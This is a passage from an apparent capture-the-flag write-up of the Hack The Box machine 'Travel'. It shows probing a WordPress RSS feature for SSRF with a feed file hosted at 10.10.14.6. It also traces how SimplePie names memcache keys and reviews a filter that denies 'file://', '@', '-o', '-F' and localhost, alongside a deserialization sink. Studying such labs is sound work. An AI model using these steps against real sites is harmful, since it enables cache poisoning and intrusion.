+		<span class="k">echo</span> <span class="s1">'&lt;p&gt;'</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$feed</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">())</span> <span class="o">.</span> <span class="s2">"&lt;/p&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s1">'&lt;/div&gt;'</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+[...omitted...]
+<span class="c">&lt;!--
+DEBUG
+</span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="c">
+--&gt;</span>
+[...omitted...]
+</code></pre></div></div>
+
+<p>There us a function <code class="highlighter-rouge">get_feed($url)</code> that is using <a href="https://simplepie.org/">SimplePie</a> for the RSS and <strong><em>memcache</em></strong> for caching data. The argument that will be fed to the function is probably passed through <strong>GET parameters</strong> (<em>custom_feed_url</em>) in <strong>http[://]blog.travel.htb/awesome-rss</strong> and if none are supplied, will default to <code class="highlighter-rouge">http://www.travel.htb/newsfeed/customfeed.xml</code>:</p>
+
+<p><img src="./screenshots/62_travel/80_www_customfeed.PNG" alt="80_www_customfeed" /></p>
+
+<p>Which has the same contents listed in <strong>http[://]blog.travel.htb/awesome-rss</strong> only in XML format.</p>
+
+<p>Aside from the <strong><code class="highlighter-rouge">get_feed($url)</code></strong> function there seems to be a debug page as well – <strong>debug.php</strong> which could be requested by adding a GET parameter, <strong><code class="highlighter-rouge">?debug</code></strong>. It will still request the usual page but will include debug statements enclosed in HTML comments:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"debug"</span> http://blog.travel.htb/awesome-rss/
+
+  <span class="o">[</span>...omitted...]
+  &lt;<span class="o">!</span><span class="nt">--</span>
+  DEBUG
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  <span class="nt">--</span><span class="o">&gt;</span>
+  <span class="o">[</span>...omitted...]
+</code></pre></div></div>
+
+<h3 id="32-checking-for-rfi-in-get_feed">3.2 Checking for RFI in get_feed()</h3>
+
+<ol>
+  <li>
+    <p>Create a <strong>customfeed.xml</strong> file based on <strong><code class="highlighter-rouge">http://www.travel.htb/newsfeed/customfeed.xml</code></strong>:</p>
+
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;rss</span> <span class="na">version=</span><span class="s">"2.0"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;channel&gt;</span>
+		<span class="nt">&lt;item&gt;</span>
+			<span class="nt">&lt;title&gt;</span>
+				Jebidiah was here
+			<span class="nt">&lt;/title&gt;</span>
+			<span class="nt">&lt;link&gt;</span>http://10.10.14.6/something<span class="nt">&lt;/link&gt;</span>
+			<span class="nt">&lt;guid&gt;</span>http://10.10.14.6/something<span class="nt">&lt;/guid&gt;</span>
+			<span class="nt">&lt;pubDate&gt;</span>Mon, 30 Sep 2019 08:20:05 -0500<span class="nt">&lt;/pubDate&gt;</span>
+			<span class="nt">&lt;description&gt;</span>
+				This is a test.
+			<span class="nt">&lt;/description&gt;</span>
+		<span class="nt">&lt;/item&gt;</span>
+	<span class="nt">&lt;/channel&gt;</span>
+<span class="nt">&lt;/rss&gt;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Start a Python HTTP Server:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> SimpleHTTPServer 80
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Requesting <strong>/awesome-rss/</strong> with a <strong><em>custom_feed_url</em></strong> and <strong><em>debug</em></strong> parameter:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-G</span> <span class="nt">-d</span> <span class="s2">"debug=1&amp;custom_feed_url=http://10.10.14.6/customfeed.xml"</span> http://blog.travel.htb/awesome-rss/
+   
+  <span class="o">[</span>...omitted...]
+  &lt;<span class="o">!</span><span class="nt">--</span>
+  DEBUG
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  | xct_54bddbaec1<span class="o">(</span>...<span class="o">)</span> | a:4:<span class="o">{</span>s:5:<span class="s2">"child"</span><span class="p">;</span>a:1:<span class="o">{</span>s:0:<span class="s2">""</span><span class="p">;</span>a:1:<span class="o">{(</span>...<span class="o">)</span> |
+   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+  <span class="nt">--</span><span class="o">&gt;</span>
+  <span class="o">[</span>...omitted...]
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Looking back at started HTTP server:</p>
+
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.10.189 - - [xx/xxx/xxxx xx:xx:xx] "GET /customfeed.xml HTTP/1.1" 200 -
+10.10.10.189 - - [xx/xxx/xxxx xx:xx:xx] "GET /customfeed.xml HTTP/1.1" 200 -
+</span></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>The request to the local HTTP Server went through and it seems like a PHP serialized object was logged into memcache as indicated by the <strong><code class="highlighter-rouge">xct_</code></strong> prefix.</p>
+
+<h3 id="33-interaction-with-memcache">3.3 Interaction with memcache</h3>
+
+<h4 id="331-how-data-is-saved-to-memcache">3.3.1 How data is saved to memcache</h4>
+
+<p>Based on the <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php"><strong>class-simplepie.php</strong></a> which is included in <strong>rss_template.php</strong> extracted from the <a href="">WordPress Github Page</a>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nv">$parsed_feed_url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registry</span><span class="o">-&gt;</span><span class="na">call</span><span class="p">(</span><span class="s1">'Misc'</span><span class="p">,</span> <span class="s1">'parse_url'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span><span class="p">));</span>
+
+	<span class="c1">// Decide whether to enable caching</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$parsed_feed_url</span><span class="p">[</span><span class="s1">'scheme'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">force_feed</span> <span class="o">?</span> <span class="s1">'#force_feed'</span> <span class="o">:</span> <span class="s1">''</span><span class="p">);</span>
+		<span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registry</span><span class="o">-&gt;</span><span class="na">call</span><span class="p">(</span><span class="s1">'Cache'</span><span class="p">,</span> <span class="s1">'get_handler'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_location</span><span class="p">,</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span><span class="p">,</span> <span class="nv">$url</span><span class="p">),</span> <span class="s1">'spc'</span><span class="p">));</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Fetch the data via SimplePie_File into $this-&gt;raw_data</span>
+	<span class="k">if</span> <span class="p">((</span><span class="nv">$fetched</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch_data</span><span class="p">(</span><span class="nv">$cache</span><span class="p">))</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">elseif</span> <span class="p">(</span><span class="nv">$fetched</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">list</span><span class="p">(</span><span class="nv">$headers</span><span class="p">,</span> <span class="nv">$sniffed</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$fetched</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+<span class="k">public</span> <span class="nv">$cache_name_function</span> <span class="o">=</span> <span class="s1">'md5'</span><span class="p">;</span>
+<span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+<span class="k">public</span> <span class="k">function</span> <span class="nf">set_cache_name_function</span><span class="p">(</span><span class="nv">$function</span> <span class="o">=</span> <span class="s1">'md5'</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="nv">$function</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="nv">$function</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>When the <strong><code class="highlighter-rouge">feed_url</code></strong> parameter is not <strong><code class="highlighter-rouge">null</code></strong>, a <strong><code class="highlighter-rouge">call()</code></strong> function from the <strong><code class="highlighter-rouge">registry</code></strong> property will be made to a <strong><code class="highlighter-rouge">get_handler()</code></strong> function in <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache.php"><strong>Cache.php</strong></a> and in this case the value of <strong><code class="highlighter-rouge">$this-&gt;cache_location</code></strong> has been set to <strong><code class="highlighter-rouge">memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_</code></strong> and <strong><code class="highlighter-rouge">$url</code></strong> will be hashed using <strong>MD5</strong> based on <strong><code class="highlighter-rouge">call_user_func($this-&gt;cache_name_function, $url)</code></strong>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+<span class="k">protected</span> <span class="k">static</span> <span class="nv">$handlers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+	<span class="s1">'mysql'</span>     <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_MySQL'</span><span class="p">,</span>
+	<span class="s1">'memcache'</span>  <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Memcache'</span><span class="p">,</span>
+	<span class="s1">'memcached'</span> <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Memcached'</span><span class="p">,</span>
+	<span class="s1">'redis'</span>     <span class="o">=&gt;</span> <span class="s1">'SimplePie_Cache_Redis'</span>
+<span class="p">);</span>
+<span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+<span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">get_handler</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nv">$type</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+	<span class="nv">$type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">]))</span>
+	<span class="p">{</span>
+		<span class="nv">$class</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$handlers</span><span class="p">[</span><span class="nv">$type</span><span class="p">];</span>
+		<span class="k">return</span> <span class="k">new</span> <span class="nv">$class</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+	<span class="p">}</span>
+
+    <span class="k">return</span> <span class="k">new</span> <span class="nx">SimplePie_Cache_File</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$extension</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">[</span><span class="o">...</span><span class="nx">omitted</span><span class="o">...</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>What will happen is that the substring, <strong><code class="highlighter-rouge">memcache</code></strong>, will be extracted from the passed location (<code class="highlighter-rouge">memcache://127.0.0.1...</code>)  which will return <strong><code class="highlighter-rouge">SimplePie_Cache_Memcache</code></strong> based on the array of handlers defined. After which a newly initialized class of the same name will be returned.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$location</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+		<span class="s1">'host'</span> <span class="o">=&gt;</span> <span class="s1">'127.0.0.1'</span><span class="p">,</span>
+		<span class="s1">'port'</span> <span class="o">=&gt;</span> <span class="mi">11211</span><span class="p">,</span>
+		<span class="s1">'extras'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
+			<span class="s1">'timeout'</span> <span class="o">=&gt;</span> <span class="mi">3600</span><span class="p">,</span> <span class="c1">// one hour</span>
+			<span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">'simplepie_'</span><span class="p">,</span>
+		<span class="p">),</span>
+	<span class="p">);</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span> <span class="o">=</span> <span class="nx">SimplePie_Misc</span><span class="o">::</span><span class="na">array_merge_recursive</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">,</span> <span class="nx">SimplePie_Cache</span><span class="o">::</span><span class="na">parse_URL</span><span class="p">(</span><span class="nv">$location</span><span class="p">));</span>
+
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">'extras'</span><span class="p">][</span><span class="s1">'prefix'</span><span class="p">]</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"</span><span class="nv">$name</span><span class="s2">:</span><span class="nv">$type</span><span class="s2">"</span><span class="p">);</span>
+
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Memcache</span><span class="p">();</span>
+	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">addServer</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The constructor function taken from the <strong><code class="highlighter-rouge">SimplePie_Cache_Memcache</code></strong> class definition <a href="https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcache.php"><strong>Memcache.php</strong></a> takes the same parameters from the ones passed to <strong><code class="highlighter-rouge">get_handler()</code></strong> from <strong>Cache.php</strong>. The values from <strong><code class="highlighter-rouge">$this-&gt;options</code></strong> will be changed since some values were set in the <strong><code class="highlighter-rouge">$location</code></strong> variable (<strong><code class="highlighter-rouge">?timeout=60&amp;prefix=xct_</code></strong>) so in this case, the prefix that will be used is <strong><code class="highlighter-rouge">xct_</code></strong> instead of <strong><code class="highlighter-rouge">simplepie</code></strong>. Afterwhich, the value of <strong><code class="highlighter-rouge">$name</code></strong> will be appended to the prefix.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="nf">save</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$data</span> <span class="nx">instanceof</span> <span class="nx">SimplePie</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="nx">MEMCACHE_COMPRESSED</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">options</span><span class="p">[</span><span class="s1">'extras'</span><span class="p">][</span><span class="s1">'timeout'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The data provided (contents of <strong><code class="highlighter-rouge">$url</code></strong>) will then be serialized and saved into the cache.</p>
+
+<p>To summarize specific to this scenario:</p>
+
+<ol>
+  <li>The caching begins by taking three parameters that will be passed to the <strong><code class="highlighter-rouge">get_handler()</code></strong> function in <strong>Cache.php</strong> – <strong><code class="highlighter-rouge">memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_</code></strong>, <strong><code class="highlighter-rouge">fe1fb813519a90aa175e3f3d721a07ca</code></strong> (MD5 value of <strong><code class="highlighter-rouge">http://10.10.14.6/customfeed.xml</code></strong>), and <code class="highlighter-rouge">spc</code></li>
+  <li>The <strong><code class="highlighter-rouge">get_handler()</code></strong> function will then determine what method of caching is needed based on the first parameter given; in this case, <strong>memcache</strong> so the class definition of <strong><code class="highlighter-rouge">SimplePie_Cache_Memcache</code></strong> will be used. The name of the data that will be written in the cache will follow the format –__<code class="highlighter-rouge">xct_</code>__ plus the value of <strong><code class="highlighter-rouge">md5("fe1fb813519a90aa175e3f3d721a07ca:spc")</code></strong></li>
+  <li>A serialized version of the data will then be saved in to the cached catalogued with the prefix plus the newly generated md5.</li>
+</ol>
+
+<h4 id="332-review-of-debugphp">3.3.2 Review of debug.php</h4>
+
+<p>The output for <strong>debug.php</strong> last time when <strong><code class="highlighter-rouge">http://10.10.14.6/customfeed.xml</code></strong> was requested was:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+</span><span class="gp">  | xct_54bddbaec1(...) | a:4:{s:5:"child";</span>a:1:<span class="o">{</span>s:0:<span class="s2">""</span><span class="p">;</span>a:1:<span class="o">{(</span>...<span class="o">)</span> |
+<span class="go">   ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+</span></code></pre></div></div>
+
+<p>Following the process explained earlier, the marker generated (<strong><code class="highlighter-rouge">xct_54bddbaec1(...)</code></strong>) should be the same as <strong><code class="highlighter-rouge">md5(md5("http://10.10.14.6/customfeed.xml").":spc");</code></strong> which is actually the case – <strong>54bddbaec1543acec82c7141efde0625</strong></p>
+
+<h3 id="34-input-sanitation-with-templatephp">3.4 Input Sanitation with template.php</h3>
+
+<h4 id="341-review-of-templatephp">3.4.1 Review of template.php</h4>
+
+<p>This file was also extracted from the contents of http[://]blog-dev.travel.htb/.git/ and it seems to be responsible for validating user input supplied in the <strong><em>url</em></strong> parameter when requesting <strong>/awesome-rss/</strong>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="cd">/**
+ Todo: finish logging implementation via TemplateHelper
+*/</span>
+
+<span class="k">function</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// this should be secure</span>
+	<span class="nv">$tmpUrl</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nx">PHP_URL_HOST</span><span class="p">);</span>
+	<span class="c1">// preventing all localhost access</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>		
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="o">.</span><span class="nv">$url</span><span class="p">;</span>
+	<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <strong><code class="highlighter-rouge">safe($url)</code></strong> defined prevents <em>Local File Inclusion (LFI)</em> using <strong><code class="highlighter-rouge">file://</code></strong> and <em>Server-Side Request Forgery (SSRF)</em> by filtering requests made via <strong>localhost</strong>. Meanwhile, even though there is a <strong><code class="highlighter-rouge">shell_exec()</code></strong> function in <strong><code class="highlighter-rouge">url_get_contents()</code></strong>, <em>Command Injection</em> is avoided by first passing through the <strong><code class="highlighter-rouge">safe()</code></strong> function to avoid polluting the <strong><code class="highlighter-rouge">curl</code></strong> command and then passing the <strong><em>url</em></strong> parameter through <code class="highlighter-rouge">escapeshellarg()</code> to avoid injection using <strong><code class="highlighter-rouge">/$(&lt;command&gt;)</code></strong> or appending new commands after a semi-colon (<strong><code class="highlighter-rouge">;&lt;command&gt;</code></strong>) to name a few examples.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">init</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s1">'/logs/'</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Also inside <strong>template.php</strong> is a defined class, <strong><code class="highlighter-rouge">TemplateHelper</code></strong>. There are two initialized object properties defined in the class, <strong><em>file</em></strong> and <strong><em>data</em></strong>, based on the class constructor. The <strong><code class="highlighter-rouge">__wakeup()</code></strong> function is executed during deserialization. In this case, the defined function, <strong><code class="highlighter-rouge">init()</code></strong> will be executed when <strong><code class="highlighter-rouge">__wakeup()</code></strong> is triggered. <strong><code class="highlighter-rouge">init()</code></strong> will write to <strong><code class="highlighter-rouge">__DIR__.'/logs'</code></strong> with the filename defined in <strong><code class="highlighter-rouge">$file</code></strong> and contents defined in <strong><code class="highlighter-rouge">$data</code></strong>.</p>
+
+<h4 id="342-the-location-of-__dir__logs">3.4.2 The location of <code class="highlighter-rouge">__DIR__</code>.’/logs’</h4>
+
+<p>Earlier when the contents of <strong>http[://]blog-dev.travel.htb/.git</strong> were extracted, the <strong>README.md</strong> file stated that <strong>rss_template.php</strong> and <strong>template.php</strong> were saved to <strong><code class="highlighter-rouge">wp-content/themes/twentytwenty</code></strong>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">  #</span><span class="c"># Setup</span>
+<span class="go">
+  * `git clone https://github.com/WordPress/WordPress.git`
+  * copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty` 
+  * create logs directory in `wp-content/themes/twentytwenty` 
+  * create page in backend and choose rss_template.php as theme
+</span></code></pre></div></div>
+
+<p>Proving that <strong><code class="highlighter-rouge">./logs</code></strong> is in the same directory:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-I</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/
+
+  HTTP/1.1 403 Forbidden
